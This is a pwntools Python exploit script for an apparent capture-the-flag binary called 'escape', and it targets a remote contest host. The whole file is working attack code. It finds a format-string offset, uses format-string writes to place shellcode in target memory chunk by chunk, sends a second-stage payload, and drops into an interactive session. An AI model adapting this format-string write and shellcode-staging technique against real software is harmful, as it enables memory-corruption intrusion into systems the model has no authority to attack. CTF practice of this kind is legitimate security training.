#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

exe = context.binary = ELF(args.EXE or 'escape')

shellcode_addr = 0x50510000

host = args.HOST or 'escape.sstf.site'
port = int(args.PORT or 5051)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def exec_fmt(payload):
    io.sendlineafter(b"Enter: ", payload)
    io.recvuntil(b"Entered: ")
    return io.recvuntil(b'END')

autofmt = FmtStr(exec_fmt)

offset = autofmt.offset
info(f'{offset = }')


shellcode = asm(
        shellcraft.echo('GOGOGOGOGOGOGOGOGOGOGOGOGO') + \
        shellcraft.echo('Shellcode: ') + \
        shellcraft.read(0, shellcode_addr + 0x100, 0x1000)
    )

print(shellcraft.execve('cat flag'))

chunks = [shellcode[i:i+8] for i in range(0, len(shellcode), 8)]

for i, x in enumerate(chunks):
    payload = fmtstr_payload(offset, {shellcode_addr+i*8: x}, write_size='short')
    io.sendlineafter(b'Enter: ', payload)

io.sendline(b'done')

io.recvuntil(b"GOGOGOGOGOGOGOGOGOGOGOGOGO")

io.send(asm(shellcraft.trap()))

io.interactive()

